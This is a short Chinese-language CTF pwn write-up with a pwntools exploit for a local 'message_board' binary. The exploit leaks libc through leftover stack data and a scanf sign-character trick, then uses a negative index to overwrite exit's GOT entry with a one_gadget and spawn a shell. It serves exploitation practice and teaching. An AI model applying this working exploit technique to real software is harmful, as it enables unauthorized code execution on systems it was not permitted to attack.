利用栈指针残留，scnaf给变量赋值时输入正负号不改变原内存处的值，导致stderr地址泄露从而泄露libc基址，绕过验证

再利用负数索将one_gadget引写入exit的got表，调用exit获取shell

**一定搞清楚字符的发送与接收**

```
from pwn import *

context(log_level='debug', os='linux', arch='amd64')

io = process('/home/kali/Desktop/message_board')
# io = gdb.debug('/home/kali/Desktop/message_board')

libc = ELF('/home/kali/Desktop/libc/libc-2.31.so')
puts_offset = libc.sym['puts']
stderr_offset = libc.sym['_IO_2_1_stderr_']
one_gadget = [0xe3afe,0xe3b01,0xe3b04]

io.sendlineafter(b'Do you have any suggestions for us\n',b'2')
io.sendline(b'+')
io.sendline(b'+')

io.recvline()
libc_base = int(io.recvline()[19:34:],10) - stderr_offset
print(libc_base)

puts_addr = libc_base+puts_offset
io.sendlineafter(b'Now please enter the verification code\n',str(puts_addr).encode(encoding='utf-8'))


a = p64(libc_base+one_gadget[2]).ljust(8,b'\00')
p1 = u32(a[0:4])
p2 = u32(a[4:8])

io.sendlineafter(b'You can modify your suggestions',str(-28).encode(encoding='utf-8'))
io.sendlineafter(b'input new suggestion',str(p1).encode(encoding='utf-8'))
io.sendlineafter(b'You can modify your suggestions',str(-27).encode(encoding='utf-8'))
io.sendlineafter(b'input new suggestion',str(p2).encode(encoding='utf-8'))

# gdb.attach(io)
io.interactive()
```
